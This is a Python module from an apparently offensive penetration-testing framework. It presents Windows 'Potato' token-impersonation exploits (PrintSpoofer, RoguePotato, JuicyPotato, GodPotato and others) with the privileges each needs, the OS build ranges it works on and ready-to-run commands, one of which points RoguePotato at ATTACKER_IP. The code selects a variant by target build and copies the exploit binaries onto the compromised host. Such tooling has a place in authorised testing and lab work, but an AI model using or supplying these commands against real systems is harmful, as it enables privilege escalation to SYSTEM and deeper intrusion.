from core.paths import get_tools_dir
from modules.upload.windows import stage_windows_files, DEFAULT_REMOTE_DIR


G, C, B, Y, W, R = (
        '\033[92m',
        '\033[96m',
        '\033[94m',
        '\033[93m',
        '\033[0m',
        '\033[91m',
)

POTATO_DIR = get_tools_dir() / "potatoes"


# ==========================================
# KNOWLEDGE BASE
# ==========================================

POTATOES = {

    "PrintSpoofer": {
        "requires": ["SeImpersonatePrivilege"],
        "build_min": 17763,
        "build_max": None,
        "method": "named pipe impersonation",
        "run": ".\\PrintSpoofer.exe -i -c cmd",
        "binaries": ["PrintSpoofer.exe", "PrintSpoofer64.exe"],
        "notes": [
            "works well on Server 2019",
            "simpler than JuicyPotato",
        ],
    },

    "RoguePotato": {
        "requires": ["SeImpersonatePrivilege"],
        "build_min": 17763,
        "build_max": None,
        "method": "OXID resolver spoofing",
        "run": '.\\RoguePotato.exe -r ATTACKER_IP -e "cmd.exe"',
        "binaries": ["RoguePotato.exe"],
        "notes": [
            "may require a socat redirector",
            "useful when PrintSpoofer fails",
        ],
    },

    "JuicyPotato": {
        "requires": ["SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege"],
        "build_min": 7600,
        "build_max": 17134,
        "method": "CLSID / DCOM abuse",
        "run": ".\\JuicyPotato.exe -t * -p cmd.exe -a \"/c cmd.exe\" -l 53375",
        "binaries": ["JuicyPotato.exe"],
        "notes": [
            "broken from Windows 10 1809 / Server 2019 onward",
            "needs a free CLSID for the target build",
        ],
    },

    "RottenPotato": {
        "requires": ["SeImpersonatePrivilege"],
        "build_min": 7600,
        "build_max": 14393,
        "method": "BITS/COM NTLM relay to localhost (127.0.0.1:6666)",
        "run": "Meterpreter: execute -H -f rottenpotato.exe, then use incognito",
        "binaries": ["RottenPotato.exe"],
        "notes": [
            "the original Potato technique — mostly of historical interest",
            "superseded by JuicyPotato; typically used via Meterpreter + incognito rather than standalone",
        ],
    },

    "GodPotato": {
        "requires": ["SeImpersonatePrivilege"],
        "build_min": 9600,
        "build_max": None,
        "method": "RPC/DCOM impersonation with no fixed CLSID or OXID resolver dependency",
        "run": '.\\GodPotato.exe -cmd "cmd /c whoami"',
        "binaries": ["GodPotato.exe"],
        "notes": [
            "reported to work from Server 2012 through Server 2022 / Win11",
            "good default choice when unsure which build-specific Potato applies",
        ],
    },

    "EfsPotato": {
        "requires": ["SeImpersonatePrivilege"],
        "build_min": 7600,
        "build_max": None,
        "method": "MS-EFSR named pipe impersonation (PetitPotam-style)",
        "run": '.\\EfsPotato.exe "cmd /c whoami"',
        "binaries": ["EfsPotato.exe", "SharpEfsPotato.exe"],
        "notes": [
            "alternative when PrintSpoofer's spoolss pipe is unavailable (e.g. Print Spooler disabled)",
            "SharpEfsPotato is the C# reimplementation",
        ],
    },

    "SweetPotato": {
        "requires": ["SeImpersonatePrivilege"],
        "build_min": 7600,
        "build_max": None,
        "method": "bundles multiple impersonation techniques (Rotten/Juicy/Efs/PrintSpoofer-style) into one binary",
        "run": '.\\SweetPotato.exe -a "whoami"',
        "binaries": ["SweetPotato.exe"],
        "notes": [
            "auto-selects a working technique for the target build",
            "useful as a catch-all when unsure which specific variant applies",
        ],
    },

}


# ==========================================
# HELPERS
# ==========================================

def _build_range(entry):
    return entry["build_min"], entry["build_max"] or 999_999


def _matches_build(entry, build):
    lo, hi = _build_range(entry)
    return lo <= build <= hi


def _binaries_on_disk(entry):
    return [
        POTATO_DIR / name
        for name in entry["binaries"]
        if (POTATO_DIR / name).is_file()
    ]


# ==========================================
# PUBLIC API
# ==========================================

def run(data, cred, args):

    #
    # Determine target OS build
    #
    build = None

    if hasattr(args, "extra") and args.extra:

        try:
            build = int(args.extra[0])
        except ValueError:
            build = None

    if build is None:

        raw = input(
            f"\n{B}[?]{W} Target OS build number (blank to see all options): "
        ).strip()

        if raw.isdigit():
            build = int(raw)

    #
    # Filter by build
    #
    if build is not None:

        candidates = {
            name: entry for name, entry in POTATOES.items()
            if _matches_build(entry, build)
        }

        if not candidates:
            print(f"{Y}[!] No variant matches build {build} — showing all options.{W}")
            candidates = POTATOES

    else:
        candidates = POTATOES

    #
    # Present options
    #
    names = list(candidates.keys())

    print()
    print(f"{C}Potato Options{f' (build {build})' if build else ''}{W}")
    print("-" * 40)

    for i, name in enumerate(names, start=1):

        entry = candidates[name]
        lo, hi = _build_range(entry)

        print(f"{C}[{i}]{W} {C}{name:<14}{W} requires: {', '.join(entry['requires'])}  builds: {lo}-{hi}")
        print(f"{'':<18} {'; '.join(entry['notes'])}")

    #
    # Pick one
    #
    if len(names) == 1:
        index = 0
    else:

        raw = input(f"\n{B}[?]{W} Pick a variant [1-{len(names)}]: ").strip()

        index = int(raw) - 1 if raw.isdigit() else -1

    if index < 0 or index >= len(names):
        print(f"{R}[-] No variant selected.{W}")
        return

    selected = names[index]

    entry = candidates[selected]
    lo, hi = _build_range(entry)

    print()
    print(f"{C}{selected}{W}")
    print("-" * 40)
    print(f"Requires : {', '.join(entry['requires'])}")
    print(f"Method   : {entry['method']}")
    print(f"Builds   : {lo} - {hi}")
    print()
    print(f"{Y}Run: {entry['run']}{W}")

    if entry["notes"]:
        print()
        print("Notes:")
        for note in entry["notes"]:
            print(f"  - {note}")

    #
    # Stage the binary, if we have one locally
    #
    binaries = _binaries_on_disk(entry)

    if not binaries:
        print()
        print(f"{Y}[!] No local binary found in {POTATO_DIR} — obtain {selected} manually.{W}")
        return

    if len(binaries) == 1:
        targets = binaries
    else:

        print()
        print("Found binaries:")

        for i, path in enumerate(binaries, start=1):
            print(f"  {C}[{i}]{W} {path}")

        raw = input(f"{B}[?]{W} Transfer which? [1-{len(binaries)}, 'all', or blank to skip]: ").strip()

        if raw.lower() == "all":
            targets = binaries
        elif raw.isdigit() and 1 <= int(raw) <= len(binaries):
            targets = [binaries[int(raw) - 1]]
        else:
            targets = []

    if not targets:
        return

    choice = input(
        f"\n{B}[?]{W} Transfer {', '.join(p.name for p in targets)} to target? [Y/n]: "
    ).strip().lower()

    if choice in ("", "y", "yes"):
        stage_windows_files(targets)
        print()
        print(f"    {B}[*]{W} Staged to {DEFAULT_REMOTE_DIR} — cd there before running the command above.")
